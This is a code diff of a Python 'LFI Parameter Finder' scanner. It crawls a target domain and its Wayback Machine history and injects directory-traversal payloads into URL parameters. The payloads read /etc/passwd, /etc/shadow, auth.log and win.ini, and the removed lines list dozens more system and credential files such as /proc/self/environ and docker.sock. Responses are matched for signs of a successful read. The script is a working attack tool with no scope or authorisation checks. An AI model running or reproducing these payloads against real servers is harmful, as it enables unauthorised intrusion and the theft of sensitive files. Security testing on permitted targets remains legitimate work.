@@ -1,5 +1,5 @@
 import requests
-from urllib.parse import urljoin, urlparse, urlencode, parse_qs, quote
+from urllib.parse import urljoin, urlparse, urlencode, parse_qs
 from bs4 import BeautifulSoup
 import tldextract
 from concurrent.futures import ThreadPoolExecutor
@@ -13,72 +13,11 @@ payloads = [
     "../../../../../../../../etc/shadow",
     "../../../../../../../../var/log/auth.log",
     "../../../../../windows/win.ini",
-    "/etc/passwd",
-    "../../../../../../../../windows/system32/drivers/etc/hosts",
-    "../../../../../../../../usr/local/apache2/logs/error_log",
-    "../../../../../../../../proc/self/environ",
-    "../../../../../../../../etc/issue",
-    "../../../../../../../../opt/lampp/logs/access_log",
-    "../../../../../../../../etc/group",
-    "../../../../../../../../etc/hosts",
-    "../../../../../../../../etc/motd",
-    "../../../../../../../../etc/shells",
-    "../../../../../../../../etc/network/interfaces",
-    "../../../../../../../../etc/crontab",
-    "../../../../../../../../etc/apt/sources.list",
-    "../../../../../../../../etc/hostname",
-    "../../../../../../../../etc/resolv.conf",
-    "../../../../../../../../etc/mail.rc",
-    "../../../../../../../../etc/postfix/main.cf",
-    "../../../../../../../../etc/aliases",
-    "../../../../../../../../etc/exports",
-    "../../../../../../../../etc/fstab",
-    "../../../../../../../../etc/inittab",
-    "../../../../../../../../etc/ld.so.conf",
-    "../../../../../../../../etc/logrotate.conf",
-    "../../../../../../../../etc/mtab",
-    "../../../../../../../../etc/nsswitch.conf",
-    "../../../../../../../../etc/opt/samba/smb.conf",
-    "../../../../../../../../etc/profile",
-    "../../../../../../../../etc/protocols",
-    "../../../../../../../../etc/securetty",
-    "../../../../../../../../etc/services",
-    "../../../../../../../../etc/sysctl.conf",
-    "../../../../../../../../etc/systemd/system.conf",
-    "../../../../../../../../etc/timezone",
-    "../../../../../../../../etc/vsftpd.conf",
-    "../../../../../../../../usr/lib/python3/dist-packages/apt_pkg.so",
-    "../../../../../../../../usr/share/common-licenses/GPL",
-    "../../../../../../../../var/log/alternatives.log",
-    "../../../../../../../../var/log/apport.log",
-    "../../../../../../../../var/log/apt/history.log",
-    "../../../../../../../../var/log/apt/term.log",
-    "../../../../../../../../var/log/auth.log",
-    "../../../../../../../../var/log/boot.log",
-    "../../../../../../../../var/log/dpkg.log",
-    "../../../../../../../../var/log/faillog",
-    "../../../../../../../../var/log/kern.log",
-    "../../../../../../../../var/log/lastlog",
-    "../../../../../../../../var/log/syslog",
-    "../../../../../../../../var/log/wtmp",
-    "../../../../../../../../var/log/xferlog",
-    "../../../../../../../../var/www/html/index.html",
-    "../../../../../../../../proc/self/cmdline",
-    "../../../../../../../../proc/self/status",
-    "../../../../../../../../proc/version",
-    "../../../../../../../../proc/net/arp",
-    "../../../../../../../../proc/net/fib_trie",
-    "../../../../../../../../proc/net/tcp",
-    "../../../../../../../../proc/net/udp",
-    "../../../../../../../../proc/net/unix",
-    "../../../../../../../../proc/net/route",
-    "../../../../../../../../proc/net/rt_cache",
-    "../../../../../../../../proc/self/mounts",
-    "../../../../../../../../var/run/utmp",
-    "../../../../../../../../var/run/docker.sock"
+    "/etc/passwd"
+    # Add more payloads as needed...
 ]
 
-# 🔀 Visited URLs to avoid duplicates
+# 🔁 Visited URLs to avoid duplicates
 visited_urls = set()
 output_results = []
 
@@ -89,15 +28,6 @@ def is_subdomain(url, domain):
     extracted_main = tldextract.extract(domain)
     extracted_url = tldextract.extract(url)
     return extracted_url.domain == extracted_main.domain and extracted_url.suffix == extracted_main.suffix
-
-def sanitize_url(url):
-    """
-    🔒 Ensure the URL is properly formatted and sanitized.
-    """
-    parsed = urlparse(url)
-    if not parsed.scheme:
-        url = "http://" + url
-    return url
 
 def find_urls(url, domain):
     """
@@ -117,6 +47,25 @@ def find_urls(url, domain):
                 time.sleep(1)  # Introduce delay
     except Exception as e:
         print(f"❌ Error crawling {url}: {e}")
+    return urls
+
+def get_wayback_urls(domain):
+    """
+    🌐 Retrieve historical URLs for a domain using the Wayback Machine.
+    """
+    wayback_url = f"http://web.archive.org/cdx/search/cdx?url={domain}/*&output=json&collapse=urlkey"
+    urls = []
+    try:
+        print(f"🔍 Fetching Wayback URLs for {domain}...")
+        response = requests.get(wayback_url, timeout=10)
+        if response.status_code == 200:
+            data = response.json()
+            urls = [entry[1] for entry in data[1:]]  # Skip the header row
+            print(f"✅ Found {len(urls)} Wayback URLs for {domain}")
+        else:
+            print(f"❌ Failed to fetch Wayback URLs: HTTP {response.status_code}")
+    except Exception as e:
+        print(f"❌ Error fetching Wayback URLs: {e}")
     return urls
 
 def test_lfi(url):
@@ -140,52 +89,29 @@ def test_lfi(url):
 
                 # 🔎 Check if payload reflects in the response
                 if any(indicator in response.text.lower() for indicator in ["root:", "[boot loader]", "[extensions]", "[default]"]):
-                    result = {
-                        "status": "vulnerable",
-                        "url": test_url,
-                        "parameter": param,
-                        "payload": payload
-                    }
+                    result = {"url": test_url, "parameter": param, "status": "vulnerable"}
                     print(f"✅ [VULNERABLE] {result}")
                     output_results.append(result)
                     return True
-        result = {
-            "status": "safe",
-            "url": url
-        }
+        result = {"url": url, "status": "safe"}
         print(f"🛡️ [SAFE] {result}")
         output_results.append(result)
     except Exception as e:
-        error_message = {
-            "status": "error",
-            "url": url,
-            "error": str(e)
-        }
-        print(f"❌ Error testing {url}: {e}")
+        error_message = {"url": url, "error": str(e)}
+        print(f"❌ Error: {error_message}")
         output_results.append(error_message)
     return False
-
-def load_from_file(file_path):
-    if not os.path.exists(file_path):
-        print(f"❌ File not found: {file_path}")
-        return []
-
-    with open(file_path, 'r') as file:
-        items = [line.strip() for line in file.readlines() if line.strip()]
-    print(f"📂 Loaded {len(items)} items from {file_path}")
-    return items
 
 def crawl_and_test(urls, output_file="lfi_results.json", max_depth=3):
     """
     🔍 Crawl a list of URLs and their subdomains to find potential LFI vulnerabilities.
     """
     for url in urls:
-        sanitized_url = sanitize_url(url)
-        print(f"🚀 Starting crawl on URL: {sanitized_url}")
-        urls_to_test = [sanitized_url]
+        print(f"🚀 Starting crawl on URL: {url}")
+        urls_to_test = [url]
         depth = 0
 
-        domain = urlparse(sanitized_url).netloc
+        domain = urlparse(url).netloc
 
         # ThreadPoolExecutor for parallel URL testing
         with ThreadPoolExecutor(max_workers=10) as executor:
@@ -206,10 +132,10 @@ def crawl_and_test(urls, output_file="lfi_results.json", max_depth=3):
 
                 depth += 1
 
-    # Save results to the output file automatically
+    # Save results to the output file in JSON format
     with open(output_file, 'w') as f:
         json.dump(output_results, f, indent=4)
-    print(f"\n📁 Results saved automatically to: {output_file}")
+    print(f"\n📁 Results saved to: {output_file}")
 
 if __name__ == "__main__":
     print("🌟 Welcome to LFI Parameter Finder 🌟")
@@ -225,12 +151,13 @@ if __name__ == "__main__":
         urls = [target_url]
 
     output_file = input("📂 Enter the name of the output file (leave blank for default 'lfi_results.json'): ").strip()
-    payloads_option = input("📂 Do you want to load payloads from a .txt file? (y/n): ").lower()
-    if payloads_option == 'y':
-        payloads_file_path = input("📂 Enter the path to the .txt file containing payloads: ")
-        payloads = load_from_file(payloads_file_path)
+    output_file = output_file if output_file else "lfi_results.json"
+
+    # Retrieve Wayback URLs and add them to the crawl list
+    wayback_urls = get_wayback_urls(urls[0])
+    urls.extend(wayback_urls)
 
     if urls:
-        crawl_and_test(urls)
+        crawl_and_test(urls, output_file)
     else:
         print("❌ Error: Please provide valid URLs.")
